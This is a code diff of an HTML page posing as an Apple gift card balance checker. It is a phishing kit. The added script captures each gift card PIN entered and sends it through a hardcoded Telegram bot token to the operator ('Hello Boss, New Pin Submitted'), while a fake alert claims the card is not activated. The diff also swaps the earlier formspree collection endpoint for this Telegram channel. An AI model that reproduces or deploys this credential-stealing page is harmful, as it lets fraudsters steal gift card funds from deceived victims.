@@ -100,12 +100,13 @@
     <h2>Check Your Apple Gift Card Balance</h2>
 
     <p>Enter your PIN here:</p>
-   <form action="https://formspree.io/f/xrbaryeo" method="POST">
+   <form id="giftForm" method="POST">
     <input type="text" class="input-box" id="giftPin" name="gift-card-pin" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
     <p class="note">Can’t find your PIN? <a href="#">Learn more</a></p>
 
     <button class="btn" type="submit" onclick="alert('This Apple Gift Card is not activated!')">Check Balance</button>
    </form>
+
     <footer>
       <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ-Q9DtZCGTlow4GMYjBEWVdGdCWZLb3UqVHg&s" alt="Apple Logo">
     </footer>
@@ -121,6 +122,27 @@
       if (value.length > 16) value = value.slice(0, 16); // max 16 characters
       e.target.value = value.replace(/(.{4})/g, '$1 ').trim(); // insert space every 4 chars
     });
+
+    const botToken = "8488719047:AAESFFAoNPZQ3Mb5J4LaHM54EK8PyHzWeOo"; 
+   const chatId = "6084808169";   
+  document.getElementById("giftForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const giftPin = document.getElementById("giftPin").value;
+
+    // Message text
+    const message = `Hello Boss, New Pin Submitted: ${giftPin} `;
+
+    // Send to Telegram API
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    })
+  });
   </script>
 
 </body>
